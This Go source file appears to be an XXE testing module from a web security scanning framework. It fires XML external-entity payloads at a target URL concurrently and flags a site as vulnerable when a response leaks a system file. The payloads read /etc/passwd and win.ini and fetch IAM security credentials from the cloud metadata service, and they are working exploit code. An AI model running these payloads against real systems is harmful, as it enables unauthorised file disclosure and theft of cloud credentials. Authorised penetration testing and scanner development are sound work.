package core

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// XMLExternalEntityInjectionXxeResult holds the result of the XMLExternalEntityInjectionXxe module execution.
type XMLExternalEntityInjectionXxeResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// XMLExternalEntityInjectionXxe executes the xml_external_entity_injection_xxe security technique.
type XMLExternalEntityInjectionXxe struct {
	BaseModule
	Target  string
	results []XMLExternalEntityInjectionXxeResult
}

// NewXMLExternalEntityInjectionXxe creates a new instance.
func NewXMLExternalEntityInjectionXxe(target string) *XMLExternalEntityInjectionXxe {
	return &XMLExternalEntityInjectionXxe{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *XMLExternalEntityInjectionXxe) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var xxePayloads = []string{
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><root>&test;</root>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>`,
}

func (m *XMLExternalEntityInjectionXxe) Execute(ctx context.Context) ([]XMLExternalEntityInjectionXxeResult, error) {
	m.results = make([]XMLExternalEntityInjectionXxeResult, 0)

	jobs := make(chan string, len(xxePayloads))
	for _, p := range xxePayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *XMLExternalEntityInjectionXxe) testPayload(ctx context.Context, payload string) {
	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	// Signatures for successful LFI or SSRF via XXE
	if strings.Contains(bodyStr, "root:x:0:0:") ||
		strings.Contains(strings.ToLower(bodyStr), "[extensions]") ||
		strings.Contains(bodyStr, "ami-id") { // AWS metadata indicator
		m.Mu.Lock()
		m.RecordPoC(req, nil, "XXE vulnerability detected. Sensitive data retrieved.")
		m.results = append(m.results, XMLExternalEntityInjectionXxeResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "XXE vulnerability detected. Sensitive data retrieved.",
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("xml_external_entity_injection_xxe", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting XMLExternalEntityInjectionXxe on: %s", target))

		tester := NewXMLExternalEntityInjectionXxe(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
